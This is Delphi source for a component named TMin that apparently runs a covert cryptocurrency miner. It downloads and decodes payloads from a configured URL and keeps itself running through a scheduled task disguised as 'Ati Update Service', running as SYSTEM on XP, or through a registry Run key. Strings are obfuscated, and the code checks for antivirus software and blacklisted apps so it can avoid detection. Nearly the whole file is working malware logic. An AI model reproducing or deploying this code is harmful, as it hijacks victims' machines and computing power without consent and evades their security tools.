unit Ming;

interface

uses
  Windows, Classes, ExtCtrls, TlHelp32, SysUtils, uFnc, uInfo, uTypes, uEnc, PJResFile, Registry, ShellApi, uTsk, uAnt, uEof;

type
  TMin = class(TComponent)
  private
    Tmr: TTimer;
    ConfigData: TCnfg;
    function PIsRun(PathName: string): Boolean;
    procedure CheckMng(Sender: TObject);
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    destructor Destroy(); override;
    procedure Run();
    procedure Stop();
    function GetVersion(): Integer;
    function Start(CheckVer: Boolean = True): Boolean;
    function StopMing(): Boolean;
    procedure Enable();
    procedure Disable();
    function CheckBL(): Boolean;
  end;

var
  PCTy: string;
  PC6: Boolean;
  AVP: string;
  TSName: String;

procedure Register;

implementation

uses ComObj, DateUtils, StrUtils;

procedure Register;
begin
  Classes.RegisterComponents('MNG', [TMin]);
end;

constructor TMin.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(AOwner);
  ConfigData := Config;

  // Set Variable
  TSName := 'Ati Update Service';
  PCTy := GtInPTy(True);
  PC6 := I6Bt;
  if Config.SO <> 'XP' then
    AVP := GetAVP
  else
    AVP := '';
end; { Constructor -> Set Default Variable }

destructor TMin.Destroy;
begin
  Stop;
  inherited Destroy;
end;

{****************************************************************************
                             Private Functions
****************************************************************************}

function CIdAp(CheckNames: string; var Output: TStringList): Boolean;
var
  RG: TRegistry;
  Ky, Nm: string;
  Aps, Exp: TStringList;
  i, k: Integer;
begin
  Result := False;
  Output := TStringList.Create;

  // Load Registry HKLM
  RG := TRegistry.Create;
  RG.RootKey := HKEY_LOCAL_MACHINE;
  Ky := DE('apdo/C0t92xh/HVKGNqVyd04QSa9ipDMVIa2SAABRoIarOSgBRSOTR5toW0iscFboOlN');

  // Explode Name List
  Exp := TStringList.Create;
  Exp.Delimiter := ',';
  Exp.DelimitedText := CheckNames;

  // Search Names
  if RG.OpenKeyReadOnly(Ky) then
  try
    // Get Name List
    Aps := TStringList.Create;
    RG.GetKeyNames(Aps);
    RG.CloseKey();

    for i := 0 to Aps.Count - 1 do
      if RG.OpenKeyReadOnly(Format('%s\%s', [Ky, Aps.Strings[i]])) then
      try
        // Find
        Nm := RG.ReadString('DisplayName');
        for k := 0 to Exp.Count - 1 do
          if Pos(AnsiUpperCase(Exp.Strings[k]), AnsiUpperCase(Nm)) > 0 then begin
            Output.Add(Nm);
            Result := True;
          end;
      finally
        RG.CloseKey();
      end;
  finally
    Aps.Free;
    Exp.Free;
    RG.Free;
  end;
end; { CheckInstalledApps -> Kurulu uygulamalar arasýnda arama yapar }

function ExRsArc(APath, DPath: string): Boolean;
var
  PJ: TPJResourceFile;
  i: Integer;
  FS: TFileStream;
  Buffer: AnsiString;
begin
  Result := True;
  PJ := TPJResourceFile.Create;
  PJ.LoadFromFile(APath);

  try
    for i := 0 to PJ.EntryCount - 1 do begin
      // Read Buffer
      SetLength(Buffer, PJ.Entries[i].Data.Size);
      PJ.Entries[i].Data.ReadBuffer(Buffer[1], PJ.Entries[i].Data.Size);

      // Decode
      Buffer := DE(Buffer);

      // Write File
      FS := TFileStream.Create(AddSlash(DPath) + PJ.Entries[i].ResName, fmCreate or fmOpenWrite and fmShareDenyWrite);
      FS.WriteBuffer(Buffer[1], Length(Buffer));
      FS.Free
    end;
  except
    Result := False;
  end;

  if PJ.EntryCount = 0 then Result := False;
  PJ.Free;
end; { ExtractResArchive -> Res Data Dosyalarýný Çýkartýr }

function TMin.PIsRun(PathName: string): Boolean;
var
  Proc: TProcessEntry32;
  hSnap: HWND;
  Looper: BOOL;
  myPID: DWORD;
  myHandle: THandle;
  fullPath: string;
begin
  Result := False;

  // Find Process
  Proc.dwSize := SizeOf(Proc);
  hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
  Looper := Process32First(hSnap, Proc);

  PathName := UpperCase(ExtractFileName(PathName));
  while Integer(Looper) <> 0 do begin
    if (PathName = UpperCase(ExtractFileName(Proc.szExeFile))) then begin
      Result := True;
      Break;
    end;
    Looper := Process32Next(hSnap, proc);
  end;
  CloseHandle(hSnap);
end; { ProcessIsRun -> Check Process Running }

procedure TMin.CheckMng(Sender: TObject);
var
  SL: TStringList;
begin
  // Update Timer Interval
  Tmr.Interval := ConfigData.Mng.RnTmr;

  // Check BlackList
  if CIdAp(ConfigData.Mng.Black, SL) then
    Exit;
  SL.Free;

  // Check Internet
  if not iInCon then Exit;
  if ConfigData.Mng.Eal then
    if not Start then begin
      try
        // Download File
        if ConfigData.Mng.RgUl <> '' then begin
          if DowFi(ConfigData.Mng.RgUl, AddSlash(ConfigData.Mng.RnDr) + DE('W9z4RTcv')) then begin
            // Stop All Client
            StopMing;

            // Remove Old File
            try
              if FileExists(AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E3NmOld) then DeleteFile(AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E3Nm);
              if FileExists(AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E6NmOld) then DeleteFile(AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E6NmOld);
            except
            end;

            // Extract Resource File
            if ExRsArc(AddSlash(ConfigData.Mng.RnDr) + DE('W9z4RTcv'), ConfigData.Mng.RnDr) then begin
              Start;
            end;

            // Remove Cache
            try
              DeleteFile(AddSlash(ConfigData.Mng.RnDr) + DE('W9z4RTcv'));
            except
            end;
          end;
        end;
      except
      end;
    end;
end; { CheckMng -> Check Mining Update }

{****************************************************************************
                              Public Functions
****************************************************************************}

procedure TMin.Run();
begin
  // Start Update Timer
  Tmr := TTimer.Create(Self);
  Tmr.Interval := 90000;
  Tmr.OnTimer := CheckMng;
  Tmr.Enabled := True;
end;

procedure TMin.Stop();
begin
  // Stop Timer
  Tmr.Enabled := False;
  Tmr.Free;
  ConfigData.Mng.Rnng := False;

  // Stop All Client
  KlPrc(ConfigData.Mng.E3Nm);
  KlPrc(ConfigData.Mng.E6Nm);
end;

function TMin.Start(CheckVer: Boolean = True): Boolean;
var
  ConFi: string;
  RnEx: string;
  Rnp: string;
  Ts: TTsk;
  TsD: TTskDt;
begin
  Result := False;

  // Create Directory
  if not DirectoryExists(ConfigData.Mng.RnDr) then CreateDir(ConfigData.Mng.RnDr);

  // Find PC Type and Set Config File
  ConFi := IfThen(PCTy <> 'LapTop', ConfigData.Mng.RnPm, ConfigData.Mng.RnPmL);

  // Set Exe Path for PC Architecture
  RnEx := IfThen(PC6, AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E6Nm, AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E3Nm);

  // Run Rig
  try
    if FileExists(RnEx) then begin
      // Check File Version
      if CheckVer then
        if ConfigData.Mng.Vsr > FiVr(RnEx) then Exit;

      // Check Process Running
      if PIsRun(RnEx) then begin
        ConfigData.Mng.Rnng := True;
        Result := True;
        Exit;
      end;

      // Create Config.json
      EofWrt(AddSlash(ExtractFilePath(RnEx)) + DE('qNReLsPCFj6BksF'), ConFi);

      if (ConfigData.iAd) or (ConfigData.SO = 'XP') then begin
        // Del Old key
        DlKy(HKEY_CURRENT_USER, DE('apdo/C0t92xh/HVKGNqVyd04QSa9ipDMVIa2SAABRoIarOSgBRSOTR5tvWq6'), TSName);

        // Create Task Data
        TsD := TTskDt.Create;
        TsD.Name := TSName;
        TsD.Path := IfThen(ConfigData.SO = 'XP', RnEx, QuotedStr(RnEx));
        TsD.Force := True;
        TsD.Level := DE('BRSVmOcyJC');
        TsD.Delay := '0000:59';
        TsD.Timer := DE('Gtj7TIHdMA');
        TsD.Acc := IfThen(ConfigData.SO = 'XP', 'SYSTEM', DE('FluFmWn/6HPLPjYn'));

        // Run Task
        with TTsk.Create(Self, ConfigData.SO) do begin
          Add(Tsd);
          Delay(4000);
          if Run(TsD.Name) then begin
            ConfigData.Mng.Rnng := True;
            Result := True;
          end;
        end;
      end else
        if AVP = '' then begin
          // Del Old key
          DlKy(HKEY_CURRENT_USER, DE('apdo/C0t92xh/HVKGNqVyd04QSa9ipDMVIa2SAABRoIarOSgBRSOTR5tvWq6'), TSName);

          // Run Dos Rig
          if GtDoOu(Rnp, Format('%s "%s"', [DE('sFWQnyXbCjE'), RnEx]), 'C:\', 1) then begin
            ConfigData.Mng.Rnng := True;
            Result := True;
          end;
        end else begin
          Result := True;

          // Add Key
          StKy(HKEY_CURRENT_USER, DE('apdo/C0t92xh/HVKGNqVyd04QSa9ipDMVIa2SAABRoIarOSgBRSOTR5tvWq6'), TSName , RnEx);
        end;
    end;
  except
  end;
end;

function TMin.StopMing(): Boolean;
begin
  // Stop All Client
  KlPrc(ConfigData.Mng.E3Nm);
  KlPrc(ConfigData.Mng.E6Nm);
  KlPrc(ConfigData.Mng.E3NmOld);
  KlPrc(ConfigData.Mng.E6NmOld);
  with TTsk.Create(Self, ConfigData.SO) do begin
    Stop(TSName);
    Delay(2000);
    Remove(TSName, True);
    Free;
  end;

  if PC6 then
    Result := PIsRun(ConfigData.Mng.E6Nm)
  else
    Result := PIsRun(ConfigData.Mng.E3Nm);
end;

procedure TMin.Enable();
begin
  // Enable
  ConfigData.Mng.Eal := True;
  SvCnf(ConfigData);

  // Start Mining
  Tmr.Enabled := True;
  Start(False);
end;

procedure TMin.Disable();
begin
  // Disable
  ConfigData.Mng.Eal := False;
  SvCnf(ConfigData);

  // Stop Mining
  Tmr.Enabled := False;
  StopMing;
end;

function TMin.GetVersion(): Integer;
var
  xPath: string;
begin
  if PC6 then
    xPath := AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E6Nm
  else
    xPath := AddSlash(ConfigData.Mng.RnDr) + ConfigData.Mng.E3Nm;

  if FileExists(xPath) then begin
    Result := FiVr(xPath);
  end else
    Result := 0;
end; { GetVersion -> Get Rig Exe Version }

function TMin.CheckBL(): Boolean;
var
  SL: TStringList;
begin
  Result := CIdAp(ConfigData.Mng.Black, SL);
  SL.Free;
end; { CheckBL -> Check Blacklist }

end.

